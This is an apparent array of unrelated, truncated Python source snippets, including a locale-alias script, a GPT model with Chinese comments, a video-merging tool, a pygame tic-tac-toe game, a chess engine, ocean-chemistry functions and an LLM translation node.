sys.exit(1)\n    return newdata\n\ndef check(data):\n    # Check that all alias definitions from the X11 file\n    # are actually mapped to the correct alias locales.\n    errors = 0\n    for k, v in data.items():\n        if locale.normalize(k) != v:\n            print('ERROR: %a -> %a != %a' % (k, locale.normalize(k), v),\n                  file=sys.stderr)\n            errors += 1\n    return errors\n\nif __name__ == '__main__':\n    import argparse\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--locale-alias', default=LOCALE_ALIAS,\n                        help='location of the X11 alias file '\n                             '(default: %a)' % LOCALE_ALIAS)\n    parser.add_argument('--glibc-supported', default=SUPPORTED,\n                        help='location of the glibc SUPPORTED locales file '\n                             '(default: %a)' % SUPPORTED)\n    args = parser.parse_args()\n\n    data = locale.locale_alias.copy()\n    data.update(parse_glibc_supported(args.glibc_supported))\n    data.update(parse(args.locale_alias))\n    while True:\n        # Repeat optimization while the size is decreased.\n        n = len(data)\n        data = optimize(data)\n        if len(data) == n:\n            break\n    print_differences(data, locale.locale_alias)\n    print()\n    print('locale_alias = {')\n   ",
    "import math\nimport inspect\nfrom dataclasses import dataclass\n\nimport torch\nimport torch.nn as nn\nfrom torch.nn import functional as F\n\n\nclass LayerNorm(nn.Module):\n    \"\"\" LayerNorm but with an optional bias. PyTorch doesn't support simply bias=False \"\"\"\n    \"\"\"\n    \u5c42\u5f52\u4e00\u5316\uff08Layer Normalization\uff09\u6a21\u5757\uff0c\u4f46\u5e26\u6709\u53ef\u9009\u7684\u504f\u7f6e\u3002\n\n    PyTorch \u7684\u6807\u51c6 LayerNorm \u4e0d\u652f\u6301\u7b80\u5355\u5730\u8bbe\u7f6e bias=False\uff0c\u56e0\u6b64\u8fd9\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u5e26\u6709\u53ef\u9009\u504f\u7f6e\u7684\u5c42\u5f52\u4e00\u5316\u3002\n    \"\"\"\n\n    def __init__(self, ndim, bias):\n        \"\"\"\n        \u521d\u59cb\u5316 LayerNorm \u6a21\u5757\u3002\n\n        \u53c2\u6570:\n            ndim (int): \u8f93\u5165\u7684\u7ef4\u5ea6\uff0c\u7528\u4e8e\u521d\u59cb\u5316\u6743\u91cd\u548c\u504f\u7f6e\u3002\n            bias (bool): \u662f\u5426\u4f7f\u7528\u504f\u7f6e\u3002\u5982\u679c\u4e3a True\uff0c\u5219\u4f7f\u7528\u504f\u7f6e\uff1b\u5426\u5219\uff0c\u4e0d\u4f7f\u7528\u504f\u7f6e\u3002\n        \"\"\"\n        super().__init__()\n        # \u521d\u59cb\u5316\u6743\u91cd\u53c2\u6570\uff0c\u5f62\u72b6\u4e3a (ndim,)\n        self.weight = nn.Parameter(torch.ones(ndim))\n        # \u5982\u679c\u4f7f\u7528\u504f\u7f6e\uff0c\u5219\u521d\u59cb\u5316\u504f\u7f6e\u53c2\u6570\uff1b\u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a None\n        self.bias = nn.Parameter(torch.zeros(ndim)) if bias else None\n\n    def forward(self, input):\n        \"\"\"\n        \u524d\u5411\u4f20\u64ad\u51fd\u6570\uff0c\u6267\u884c\u5c42\u5f52\u4e00\u5316\u64cd\u4f5c\u3002\n\n        \u53c2\u6570:\n            input (torch.Tensor): \u8f93\u5165\u5f20\u91cf\u3002\n\n        \u8fd4\u56de:\n            torch.Tensor: \u7ecf\u8fc7\u5c42\u5f52\u4e00\u5316\u5904\u7406\u540e\u7684\u5f20\u91cf\u3002\n        \"\"\"\n        return F.layer_norm(input, self.weight.shape, self.weight, self.bias, 1e-5)\n\n\nclass CausalSelfAttention(nn.Module):\n    \"\"\"\n    \u56e0\u679c\u81ea\u6ce8\u610f\u529b\u673a\u5236\uff08Causal Self-Attention\uff09\u6a21\u5757\u3002\n\n    \u8be5\u6a21\u5757\u5b9e\u73b0\u4e86\u591a\u5934\u81ea\u6ce8\u610f\u529b\u673a\u5236\uff0c\u5e76\u786e\u4fdd\u6bcf\u4e2a\u4f4d\u7f6e\u53ea\u80fd\u5173\u6ce8\u5230\u5176\u5de6\u4fa7\u7684\u5e8f\u5217\u5143\u7d20\uff0c\u5b9e\u73b0\u4e86\u56e0\u679c\u5173\u7cfb\u3002\n    \"\"\"\n\n    def __init__(self, config):\n        \"\"\"\n        \u521d\u59cb\u5316\u56e0\u679c\u81ea\u6ce8\u610f\u529b\u6a21\u5757\u3002\n\n        \u53c2\u6570:\n            config: \u914d\u7f6e\u5bf9\u8c61\uff0c\u5305\u542b\u4ee5\u4e0b\u5c5e\u6027\uff1a\n                - n_embd (int): \u5d4c\u5165\u7ef4\u5ea6\u3002\n                - n_head (int): \u591a\u5934\u6ce8\u610f\u529b\u7684\u5934\u6570\u3002\n                - block_size (int): \u5e8f\u5217\u7684\u6700\u5927\u957f\u5ea6\u3002\n                - bias (bool): \u662f\u5426\u4f7f\u7528\u504f\u7f6e\u3002\n                - dropout (float): Dropout \u6982\u7387\u3002\n        \"\"\"\n        super().__init__()\n        assert config.n_embd % config.n_head == 0\n        # key, query, value projections for all heads, but in a batch\n        # \u7ebf\u6027\u5c42\uff0c\u7528\u4e8e\u8ba1\u7b97\u952e\uff08key\uff09\u3001\u67e5\u8be2\uff08query\uff09\u548c\u503c\uff08value\uff09\uff0c\u6240\u6709\u5934\u7684\u53c2\u6570\u4e00\u8d77\u8ba1\u7b97\n        self.c_attn = nn.Linear(config.n_embd, 3 * config.n_embd, bias=config.bias)\n        # output projection\n        # \u7ebf\u6027\u5c42\uff0c\u7528\u4e8e\u8f93\u51fa\u6295\u5f71\n        self.c_proj = nn.Linear(config.n_embd, config.n_embd, bias=config.bias)\n        # regularization\n        # Dropout \u5c42\uff0c\u7528\u4e8e\u6ce8\u610f\u529b\u6743\u91cd\u548c\u6b8b\u5dee\u8fde\u63a5\n        self.attn_dropout = nn.Dropout(config.dropout)\n        self.resid_dropout = nn.Dropout(config.dropout)\n        # \u591a\u5934\u6ce8\u610f\u529b\u7684\u5934\u6570\n        self.n_head = config.n_head\n        # \u5d4c\u5165\u7ef4\u5ea6\n        self.n_embd = config.n_embd\n        # Dropout \u6982\u7387\n        self.dropout = config.dropout\n        # flash attention make GPU go brrrrr but support is only in PyTorch >= 2.0\n        self.flash = hasattr(torch.nn.functional, 'scaled_dot_product_attention')\n        if not self.flash:\n            print(\"WARNING: using slow attention. Flash Attention requires PyTorch >= 2.0\")\n            # causal mask to ensure that attention is only applied to the left in the input sequence\n            # \u521b\u5efa\u56e0\u679c\u63a9\u7801\uff0c\u786e\u4fdd\u6ce8\u610f\u529b\u53ea\u5e94\u7528\u4e8e\u8f93\u5165\u5e8f\u5217\u7684\u5de6\u4fa7\n            self.register_buffer(\"bias\", torch.tril(torch.ones(config.block_size, config.block_size))\n                                        .view(1, 1, config.block_size, config.block_size))\n\n    def forward(self, x):\n        \"\"\"\n        \u524d\u5411\u4f20\u64ad\u51fd\u6570\uff0c\u6267\u884c\u56e0\u679c\u81ea\u6ce8\u610f\u529b\u673a\u5236\u3002\n\n        \u53c2\u6570:\n            x (torch.Tensor): \u8f93\u5165\u5f20\u91cf\uff0c\u5f62\u72b6\u4e3a (batch_size, sequence_length, n_embd)\u3002\n\n        \u8fd4\u56de:\n            torch.Tensor: \u7ecf\u8fc7\u56e0\u679c\u81ea\u6ce8\u610f\u529b\u673a\u5236\u5904\u7406\u540e\u7684\u5f20\u91cf\uff0c\u5f62\u72b6\u4e3a (batch_size, sequence_length, n_embd)\u3002\n        \"\"\"\n        # \u83b7\u53d6\u6279\u91cf\u5927\u5c0f (B)\u3001\u5e8f\u5217\u957f\u5ea6 (T) \u548c\u5d4c\u5165\u7ef4\u5ea6 (C)\n        B, T, C = x.size() # batch size, sequence length, embedding dimensionality (n_embd)\n\n        # calculate query, key, values for all heads in batch and move head forward to be the batch dim\n        # \u8ba1\u7b97\u952e (k)\u3001\u67e5\u8be2 (q) \u548c\u503c (v) \u5bf9\u4e8e\u6240\u6709\u5934\uff0c\u5e76\u5c06\u5934\u4f5c\u4e3a\u6279\u91cf\u7ef4\u5ea6\n        q, k, v  = self.c_attn(x).split(self.n_embd, dim=2)\n        k = k.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n        q = q.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n        v = v.view(B, T, self.n_head, C // self.n_head).transpose(1, 2) # (B, nh, T, hs)\n\n        # causal self-attention; Self-attend: (B, nh, T, hs) x (B, nh, hs, T) -> (B, nh, T, T)\n        # \u56e0\u679c\u81ea\u6ce8\u610f\u529b\u673a\u5236\n        if self.flash:\n            # efficient attention using Flash Attention CUDA kernels\n            # \u4f7f\u7528 Flash Attention \u52a0\u901f\u6ce8\u610f\u529b\u8ba1\u7b97\n            y = torch.nn.functional.scaled_dot_product_attention(q, k, v, attn_mask=None, dropout_p=self.dropout if self.training else 0, is_causal=True)\n        else:\n            # manual implementation of attention\n            # \u624b\u52a8\u5b9e\u73b0\u6ce8\u610f\u529b\u673a\u5236\n            # \u8ba1\u7b97\u6ce8\u610f\u529b\u5f97\u5206\n            att = (q @ k.transpose(-2, -1)) * (1.0 / math.sqrt(k.size(-1)))\n            # \u5e94\u7528\u56e0\u679c\u63a9\u7801\n            att = att.masked_fill(self.bias[:,:,:T,:T] == 0, float('-inf'))\n            # \u5e94\u7528 softmax \u6fc0\u6d3b\u51fd\u6570\n            att = F.softmax(att, dim=-1)\n            # \u5e94\u7528 Dropout\n            att = self.attn_dropout(att)\n            # \u8ba1\u7b97\u6700\u7ec8\u8f93\u51fa\n            y = att @ v # (B, nh, T, T) x (B, nh, T, hs) -> (B, nh, T, hs)\n        # \u91cd\u5851\u8f93\u51fa\u5f20\u91cf\n        y = y.transpose(1, 2).contiguous().view(B, T, C) # re-assemble all head outputs side by side\n\n        # output projection\n        # \u8f93\u51fa\u6295\u5f71\n        # \u5e94\u7528\u6b8b\u5dee\u8fde\u63a5\u548c Dropout\n        y = self.resid_dropout(self.c_proj(y))\n        return y\n\n\nclass MLP(nn.Module):\n    \"\"\"\n    \u591a\u5c42",
    "import os\r\nimport glob\r\nfrom tqdm import tqdm\r\nfrom moviepy.editor import VideoFileClip, AudioFileClip\r\n\r\n\r\ndef process_m4s_file(file_path, suffix=\".mp4\"):\r\n    with open(file_path, 'rb') as file:\r\n        first_nine_chars = file.read(9)\r\n        if first_nine_chars == b'000000000':\r\n            remaining_content = file.read()\r\n            content = remaining_content\r\n            # \u5c06\u4fee\u6539\u540e\u7684\u5185\u5bb9\u5199\u56de\u6587\u4ef6\r\n            with open(file_path[:-4] + suffix, 'wb') as new_file:\r\n                new_file.write(content)\r\n        else:\r\n            print(f\"\u6587\u4ef6 {file_path} \u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684m4s\u6587\u4ef6\")\r\n    return file_path[:-4] + suffix\r\n\r\ndef process(directory):\r\n    m4s_files = glob.glob(os.path.join(directory, '*.m4s'))\r\n    assert len(m4s_files) == 2, f\"\u6587\u4ef6\u5939 {directory} \u4e0b\u7684m4s\u6587\u4ef6\u6570\u91cf\u4e0d\u7b49\u4e8e2\"\r\n    # sort by file size\r\n    m4s_files = sorted(m4s_files, key=lambda x: os.path.getsize(x))\r\n    mp3 = process_m4s_file(m4s_files[0], \".mp3\")\r\n    mp4 = process_m4s_file(m4s_files[1], \".mp4\")\r\n    video = VideoFileClip(mp4)\r\n    audio = AudioFileClip(mp3)\r\n    video = video.set_audio(audio)\r\n    video.write_videofile(f\"{directory}.mp4\")\r\n\r\nif __name__ == '__main__':\r\n    directorys = os.listdir()\r\n    directorys = [directory for directory in directorys if os.path.isdir(directory) and directory != \"__pycache__\" and directory+\".mp4\" not in directorys]\r\n    root = os.getcwd()\r\n    for directory in tqdm(directorys):\r\n        process(os.path.join(root, directory))\r\n",
    "import pygame\nimport sys\nfrom RoomConnect import RoomConnect\n\n# The room number is displayed on the terminal upon execution. \n# I've also put my ngrok token inside a file named \".ngrok_token.txt\" which gets read by the initialization script. \n# This is just a simple game for demonstration purposes, needs further development.\n\nclass TicTacToe:\n    def __init__(self):\n        pygame.init()\n        self.WIDTH = 600\n        self.HEIGHT = 600\n        self.screen = pygame.display.set_mode((self.WIDTH, self.HEIGHT))\n        pygame.display.set_caption('Online Tic Tac Toe')\n        \n        # Colors\n        self.WHITE = (255, 255, 255)\n        self.BLACK = (0, 0, 0)\n        self.RED = (255, 0, 0)\n        self.BLUE = (0, 0, 255)\n        \n        # Game state\n        self.board = [['' for _ in range(3)] for _ in range(3)]\n        self.current_player = 'X'\n        self.my_symbol = None\n        self.game_active = False\n        \n        # Network\n        self.network = RoomConnect(27555, \"eu\")\n        with open(\".ngrok_token.txt\") as f:\n            token = f.read().strip()\n            self.network.set_token(token)\n        \n        self.network.register_message_type(\"move\")\n        self.network.register_message_type(\"reset\")\n        \n        # Font\n        self.font = pygame.font.Font(None, 36)\n        \n        # Setup network connection\n        self.setup_connection()\n        \n    def setup_connection(self):\n        choice = input(\"Enter 'H' to host or 'J' to join: \").upper()\n        nickname = input(\"Enter your nickname: \")\n        \n        if choice == 'H':\n            self.my_symbol = 'X'\n            room_number = self.network.host_game(nickname)\n            print(f\"Your room number is: {room_number}\")\n            self.game_active = True\n            \n        elif choice == 'J':\n            self.my_symbol = 'O'\n            room_number = input(\"Enter room number: \")\n            if self.network.join_game(room_number, nickname):\n                print(\"Connected successfully!\")\n                self.game_active = True\n            else:\n                print(\"Connection failed!\")\n                pygame.quit()\n                exit()\n        \n    def draw_board(self):\n        self.screen.fill(self.WHITE)\n        \n        # Draw grid lines\n        for i in range(1, 3):\n            pygame.draw.line(self.screen, self.BLACK, \n                           (i * self.WIDTH // 3, 0), \n                           (i * self.WIDTH // 3, self.WIDTH), 3)\n            pygame.draw.line(self.screen, self.BLACK, \n                           (0, i * self.WIDTH // 3), \n                           (self.WIDTH, i * self.WIDTH // 3), 3)\n        \n        # Draw X's and O's\n        for row in range(3):\n            for col in range(3):\n                if self.board[row][col] == 'X':\n                    self.draw_x(row, col)\n                elif self.board[row][col] == 'O':\n                    self.draw_o(row, col)\n                    \n    def draw_x(self, row, col):\n        padding = 30\n        x = col * self.WIDTH // 3 + padding\n        y = row * self.WIDTH // 3 + padding\n        size = self.WIDTH // 3 - 2 * padding\n        pygame.draw.line(self.screen, self.RED, (x, y), (x + size, y + size), 3)\n        pygame.draw.line(self.screen, self.RED, (x + size, y), (x, y + size), 3)\n        \n    def draw_o(self, row, col):\n        padding = 30\n        x = col * self.WIDTH // 3 + self.WIDTH // 6\n        y = row * self.WIDTH // 3 + self.WIDTH // 6\n        radius = self.WIDTH // 6 - padding\n        pygame.draw.circle(self.screen, self.BLUE, (x, y), radius, 3)\n        \n    def handle_click(self, pos):\n        if not self.game_active:\n            return\n            \n        if self.my_symbol != self.current_player:\n            return\n            \n        x, y = pos\n        row = y // (self.WIDTH // 3)\n        col = x // (self.WIDTH // 3)\n        \n        if row < 3 and self.board[row][col] == '':\n            self.make_move(row, col)\n            \n    def make_move(self, row, col):\n        if self.board[row][col] == '':\n            self.board[row][col] = self.my_symbol\n            self.network.send_game_data('move', {\n                'position': (row, col),\n                'symbol': self.my_symbol\n            })\n            self.current_player = 'O' if self.my_symbol == 'X' else 'X'\n        \n    def check_win(self):\n        # Check rows and columns\n        for i in range(3):\n            if self.board[i][0] == self.board[i][1] == self.board[i][2] != '':\n                return self.board[i][0]\n            if self.board[0][i] == self.board[1][i] == self.board[2][i] != '':\n                return self.board[0][i]\n                \n        # Check diagonals\n        if self.board[0][0] == self.board[1][1] == self.board[2][2] != '':\n            return self.board[0][0]\n        if self.board[0][2] == self.board[1][1] == self.board[2][0] != '':\n            return self.board[0][2]\n            \n        return None\n        \n    def run(self):\n        clock = pygame.time.Clock()\n       ",
    "######################################################################################################\n############################################### ENGINE ###############################################\n######################################################################################################\n#  \n#  in binary every square on the board is accessed by 2 to the power of whatever square it is\n#\n#  Things to note from this\n#\n#  To move upwards you subtract 8 and to move downwards add 8\n#  \n#  Diagonal movement\n#  ---------------------\n#  top right    = i - 7 \n#  top left     = i - 9\n#  bottom right = i + 9\n#  bottom left  = i + 7\n#\n######################################################################################################\n######################################################################################################\n######################################################################################################\nimport math\nimport random\nimport UI_Handler as UI\n\nglobal currentBoardFullData\n\n#------------------------------------------------------------------------------------------------------------------------\n\n# bitboards\n\nglobal bitWordBoard\nglobal whitePieces\nglobal blackPieces\n\nglobal whitePawns\nglobal whiteHorses\nglobal whiteBishops\nglobal whiteRooks\nglobal whiteQueens\nglobal whiteKing\n\nglobal blackPawns\nglobal blackHorses\nglobal blackBishops\nglobal blackRooks\nglobal blackQueens\nglobal blackKing\n\nglobal playerColour\nglobal enemyColour\n\n#------------------------------------------------------------------------------------------------------------------------\n\n# used for tracking castling\n\nglobal wKingMoved\nglobal wRooksMoved\n\nglobal bKingMoved\nglobal bRooksMoved\n\nglobal wqueenSide\nglobal wkingSide\nglobal bqueenSide\nglobal bkingSide\n\n#------------------------------------------------------------------------------------------------------------------------\n\n# offsets needed for all horizonatal and diagonal moves shown visually in the diagram at the top of the code\n# use first 4 indexes for straight line moves like the rook and the last 4 for diagonal moves or all indexes for the queen\ndirectionOffsets = [-8,8,1,-1,-9,9,-7,7]    \n\n# 2d array that stores squares to edge for every square on the board and is pre computed to allow quicker lookup times\nglobal squaresToEdge\n\nglobal lastMove\nglobal Checkmate\nlastMove = [0,0]\n\npieceLookup = {\n    \"BLACKROOK\": \"\u2656\",\n    \"BLACKHORSE\": \"\u2658\",\n    \"BLACKBISHOP\": \"\u2657\",\n    \"BLACKQUEEN\": \"\u2655\",\n    \"BLACKKING\": \"\u2654\",\n    \"BLACKPAWN\": \"\u2659\",\n    \"WHITEROOK\": \"\u265c\",\n    \"WHITEHORSE\": \"\u265e\",\n    \"WHITEBISHOP\": \"\u265d\",\n    \"WHITEQUEEN\": \"\u265b\",\n    \"WHITEKING\": \"\u265a\",\n    \"WHITEPAWN\": \"\u265f\",\n    \"NONENONE\": \" \",\n    \"MOVEOVERLAY\": \"X\"\n}\n\npieceValue = {\n    \"PAWN\": 1,\n    \"HORSE\": 3,\n    \"BISHOP\": 3,\n    \"ROOK\": 5,\n    \"QUEEN\": 9, \n    \"KING\": 0\n}\n\ndef assignColours(plrColour):\n    global playerColour\n    global enemyColour\n\n    if plrColour == \"WHITE\":\n        playerColour = \"WHITE\"\n        enemyColour = \"BLACK\"\n    else:\n        playerColour = \"BLACK\"\n        enemyColour = \"WHITE\"\n\n    return enemyColour\n\ndef switchColours(colour):\n    if colour == \"WHITE\":\n        return \"BLACK\"\n    else:\n        return \"WHITE\"\n\ndef getColour(square):\n    if square == None:\n        return None\n    # input is an int\n    if square & whitePieces != 0:\n        return \"WHITE\"\n    elif square & blackPieces != 0:\n        return \"BLACK\"\n    else:\n        return \"NONE\"\n\ndef whiteAssignment(i,value):\n    global whitePawns\n    global whiteHorses\n    global whiteBishops\n    global whiteRooks\n    global whiteQueens\n    global whiteKing\n\n    if i == 0:\n        whitePawns = value\n    elif i == 1:\n        whiteBishops = value\n    elif i == 2:\n        whiteHorses = value\n    elif i == 3:\n        whiteRooks = value\n    elif i == 4:\n        whiteQueens = value\n    elif i == 5:\n        whiteKing = value\n\ndef blackAssignment(i,value):\n    global blackPawns\n    global blackHorses\n    global blackBishops\n    global blackRooks\n    global blackQueens\n    global blackKing\n    if i == 0:\n        blackPawns = value\n    elif i == 1:\n        blackBishops = value\n    elif i == 2:\n        blackHorses = value\n    elif i == 3:\n        blackRooks = value\n    elif i == 4:\n        blackQueens = value\n    elif i == 5:\n        blackKing = value    \n\ndef makeMove(square,chosenLegalMove,colour,isFake=False,extraInfo=None):\n    updateBoard(square,chosenLegalMove,colour,isFake,extraInfo) # w and b are arrays of piece bitboards [Pawns,Bishops,Horses,Rooks,Queens,King]\n\n    if not isFake:\n        global currentBoardFullData\n        castlingData = [wkingSide,wqueenSide,wKingMoved,wRooksMoved,bkingSide,bqueenSide,bKingMoved,bRooksMoved]\n        whitePiecesData = [whitePawns, whiteBishops, whiteHorses, whiteRooks, whiteQueens, whiteKing]\n        blackPiecesData = [blackPawns, blackBishops, blackHorses, blackRooks, blackQueens, blackKing]\n        currentBoardFullData = [whitePiecesData,blackPiecesData,castlingData]\n\ndef updateBoar",
    "import numpy as np\nfrom dataclasses import dataclass\nimport pandas as pd\nimport xarray as xr\nfrom ..data.sills import read_sills_data\n\n\n@dataclass\nclass Functions:\n\n    @staticmethod\n    def filter_non_nan(ds, variables):\n        \"\"\"\n        Filter an xarray.Dataset to include only samples where all specified variables are non-NaN.\n\n        Parameters:\n        - ds (xarray.Dataset): The dataset to filter.\n        - variables (list of str): List of variable names to check for non-NaN values.\n\n        Returns:\n        - xarray.Dataset: A new dataset containing only samples with non-NaN values for all specified variables.\n        \"\"\"\n        # Start with a mask of all True\n        valid_mask = xr.full_like(ds[variables[0]], True, dtype=bool)\n\n        # Combine masks for all variables\n        for var in variables:\n            valid_mask &= ds[var].notnull()\n\n        # Apply the mask to all variables in the dataset\n        return ds.where(valid_mask, drop=True)\n\n    @staticmethod\n    def wrap_to_180lon(longitude):\n        \"\"\"\n        Wraps longitude values to the range [-180, 180].\n\n        Parameters:\n        longitude (float or array-like): Longitude value(s) to be wrapped.\n\n        Returns:\n        float or np.ndarray: Longitude value(s) wrapped to the range [-180, 180].\n        \"\"\"\n        return ((longitude + 180) % 360) - 180\n\n    @staticmethod\n    def celsiustokelvin(temp_celsius):  # Okay\n        return 273.15 + temp_celsius\n    \n    @staticmethod\n    def _calculate_vapor_pressure(temp_kelvin, salinity):  # Okay\n        return 24.4543 - 67.4509 * (100 / temp_kelvin) - 4.8489 * np.log(temp_kelvin / 100) - 0.000544 * salinity\n    \n    @staticmethod\n    def _calculate_virial_coef(temp_kelvin):  # Okay\n        return -1636.75 + 12.0408 * temp_kelvin - 0.0327957 * temp_kelvin**2 + 3.16528e-5 * temp_kelvin**3\n    \n    @staticmethod\n    def _calculate_cross_virial_coef(temp_kelvin): \n        return 57.7 - 0.118 * temp_kelvin\n\n    def calculate_fco2_hum(self, theta, salinity, co2_molar_fraction, atm_pressure):\n        \"\"\"Calculate fCO2 for human-influenced conditions\"\"\"\n        temp_kelvin = self.celsiustokelvin(theta)\n        watervapor_pressure = np.exp(self._calculate_vapor_pressure(temp_kelvin, salinity))\n        virial = self._calculate_virial_coef(temp_kelvin)\n        sig = self._calculate_cross_virial_coef(temp_kelvin)\n\n        fco2 = co2_molar_fraction * (atm_pressure - watervapor_pressure) * np.exp((atm_pressure * (virial + 2 * sig)) /\n                                                                                  (0.082 * 1000 * temp_kelvin))\n        \n        return fco2\n\n    @staticmethod\n    def calculate_o2_saturation(salinity, theta):  # Okay\n        \"\"\"Calculate oxygen saturation using Gordon and Garcia equations\"\"\"\n        ts = np.log((298.15 - theta) / (273.15 + theta))\n\n        # Constants for Gordon and Garcia\n        # in mumol/kg\n        a0 = 5.80871\n        a1 = 3.20291\n        a2 = 4.17887\n        a3 = 5.10006\n        a4 = - 9.86643e-2\n        a5 = 3.80369\n        b0 = - 7.01577e-3\n        b1 = - 7.70028e-3\n        b2 = - 1.13864e-2\n        b3 = - 9.51519e-3\n        c0 = - 2.75915e-7\n\n        # Calculate oxygen saturation\n        o2sat = np.exp(a0 + a1 * ts + a2 * ts ** 2 + a3 * ts ** 3 + a4 * ts ** 4 + a5 * ts ** 5 +\n                       salinity * (b0 + b1 * ts + b2 * ts ** 2 + b3 * ts ** 3) +\n                       c0 * salinity ** 2)\n\n        return o2sat\n\n    @staticmethod\n    def calculate_aou(o2sat, oxygen):  # Okay\n        return o2sat - oxygen\n\n    @staticmethod\n    def calculate_delta_ca(alkalinity, alk_preformed, aou, constants):  # Okay\n        \"\"\"Calculate delta Ca\"\"\"\n        delta_ca = (alkalinity - alk_preformed + aou * (1 / constants['RN'] + 1 / constants['RP'])) / 2\n        return delta_ca\n\n    @staticmethod\n    def sample_is_at_north_of_sills(ds):\n        \"\"\"\n        Determine whether samples in an xarray Dataset are north of the sills boundary.\n\n        Parameters:\n        - ds (xarray.Dataset): The dataset containing `latitude` and `longitude` variables.\n        - sills (xarray.Dataset): Dataset containing `longitude` and `latitude` of the sill boundary.\n\n        Returns:\n        - xarray.DataArray: A boolean array indicating True where samples are north of the sill boundary.\n        \"\"\"\n        sills = read_sills_data()\n        # Interpolate the sill latitude at each sample's longitude\n        limit_lat = np.interp(ds[\"longitude\"], sills[\"longitude\"], sills[\"latitude\"])\n\n        # Compare sample latitudes with interpolated sill latitudes\n        mask = ds[\"latitude\"] > limit_lat\n\n        return mask\n\n    @staticmethod\n    def calculate_preformed_alkalinity(\n            mw_results, nitrate_preformed, phosphate_preformed, si_teo, northern_sills\n    ):\n        \"\"\"Calculate preformed alkalinity\"\"\"\n        mw_results['alkalinity_preformed_parametric'] = mw_results.alkalinity_preformed_parametric.where(\n            ~northern_sills, mw_results[\"alkalinity\"]\n        )\n\n   ",
    "import sys\nimport os\nimport json\nimport logging\nfrom openai import OpenAI\n\nlogging.basicConfig(level=logging.WARNING)\nlogger = logging.getLogger(__name__)\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\n\nclass UniversalTranslator:\n    def __init__(self):\n        try:\n            self.config = self._load_config()\n            self.models = {}\n            self._initialize_ai_clients()\n            logger.info(\"\u6210\u529f\u521d\u59cb\u5316AI\u5ba2\u6237\u7aef\")\n        except Exception as e:\n            logger.error(f\"\u521d\u59cb\u5316\u5931\u8d25: {str(e)}\")\n            raise\n\n    @classmethod\n    def INPUT_TYPES(s):\n        try:\n            config = s._load_config()\n            languages = list(config[\"supported_languages\"].keys())\n            model_names = list(config[\"llm\"].keys())\n            \n            return {\n                \"required\": {\n                    \"source_language\": (languages, {\n                        \"default\": languages[0],  # \u9ed8\u8ba4\u9009\u62e9\u7b2c\u4e00\u4e2a\u8bed\u8a00\n                        \"display\": \"\u6e90\u8bed\u8a00\"  # \u663e\u793a\u540d\u79f0\n                    }),\n                    \"target_language\": (languages, {\n                        \"default\": languages[1] if len(languages) > 1 else languages[0],  # \u9ed8\u8ba4\u9009\u62e9\u7b2c\u4e8c\u4e2a\u8bed\u8a00\n                        \"display\": \"\u76ee\u6807\u8bed\u8a00\"\n                    }),\n                    \"llm\": (model_names, {\n                        \"default\": model_names[0],  # \u9ed8\u8ba4\u9009\u62e9\u7b2c\u4e00\u4e2a\u6a21\u578b\n                        \"display\": \"LLM\"\n                    }),\n                    \"input_text\": (\"STRING\", {\n                        \"multiline\": True,\n                        \"default\": \"\",\n                        \"placeholder\": \"\u8bf7\u8f93\u5165\u8981\u7ffb\u8bd1\u7684\u6587\u672c\",\n                        \"display\": \"\u8f93\u5165\u6587\u672c\"\n                    }),\n                    \"fixed_terms\": (\"STRING\", {\n                        \"multiline\": True,\n                        \"default\": \"\",\n                        \"placeholder\": \"\u8f93\u5165\u683c\u5f0f\uff1a\u539f\u6587=\u8bd1\u6587\uff08\u6bcf\u884c\u4e00\u4e2a\uff09\",\n                        \"display\": \"\u56fa\u5b9a\u8bcd\u7ec4\"\n                    }),\n                }\n            }\n        except Exception as e:\n            logger.error(f\"\u83b7\u53d6\u8f93\u5165\u7c7b\u578b\u5931\u8d25: {str(e)}\")\n            return {\"required\": {\"error\": (\"STRING\", {\"default\": str(e)})}}\n\n    RETURN_TYPES = (\"STRING\",)\n    FUNCTION = \"translate\"\n    CATEGORY = \"zwen\"\n    RETURN_NAMES = (\"translated_text\",)\n\n    @staticmethod\n    def _load_config():\n        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')\n        try:\n            with open(config_path, 'r', encoding='utf-8') as f:\n                return json.load(f)\n        except Exception as e:\n            logger.error(f\"\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u5931\u8d25: {str(e)}\")\n            raise\n\n    def _initialize_ai_clients(self):\n        for model_name, model_config in self.config[\"llm\"].items():\n            try:\n                self.models[model_name] = OpenAI(\n                    api_key=model_config[\"api_key\"],\n                    base_url=model_config[\"api_base\"]\n                )\n            except Exception as e:\n                logger.error(f\"\u521d\u59cb\u5316{model_name}\u5ba2\u6237\u7aef\u5931\u8d25: {str(e)}\")\n\n    def _get_system_prompt(self, source_lang, target_lang):\n        return f\"\"\"You are a professional translator.\nYour task is to translate from {source_lang} to {target_lang} while maintaining the following principles:\n1. Maintain the original meaning and tone\n2. Use natural and fluent {target_lang}\n3. DO NOT translate any text between [KEEP] tags. Example: [KEEP]word[/KEEP] should remain exactly as is\n4. Keep any technical terms accurate\n5. Preserve the formatting and punctuation where appropriate\n6. Do not add or remove information\n\nRespond with ONLY the translation, no explanations or other text.\"\"\"\n\n    def parse_fixed_terms(self, fixed_terms_str):\n        fixed_terms = {}\n        if fixed_terms_str.strip():\n            for line in fixed_terms_str.strip().split('\\n'):\n                if '=' in line:\n                    source, target = line.split('=', 1)\n                    fixed_terms[source.strip()] = target.strip()\n        return fixed_terms\n\n    def apply_fixed_terms(self, text, fixed_terms):\n        for source, target in fixed_terms.items():\n            text = text.replace(source, f\"[KEEP]{target}[/KEEP]\")\n        return text\n\n    def restore_fixed_terms(self, text):\n        import re\n        pattern = r'\\[KEEP\\](.*?)\\[/KEEP\\]'\n        return re.sub(pattern, r'\\1', text)\n\n    def translate_text(self, text, model_name, source_lang, target_lang):\n        try:\n            model_config = self.config[\"llm\"][model_name]\n            client = self.models[model_name]\n            \n            messages = [\n                {\n                    \"role\": \"system\", \n                    \"content\": self._get_system_prompt(source_lang, target_lang)\n                },\n                {\"role\": \"user\", \"content\": text}\n            ]\n            \n            response = client.chat.completions.create(\n                model=model_config[\"model\"],\n                messages=messages,\n                temperature=model_config[\"temperature\"],\n                max_tokens=model_config[\"max_tokens\"]\n            )\n            \n            return 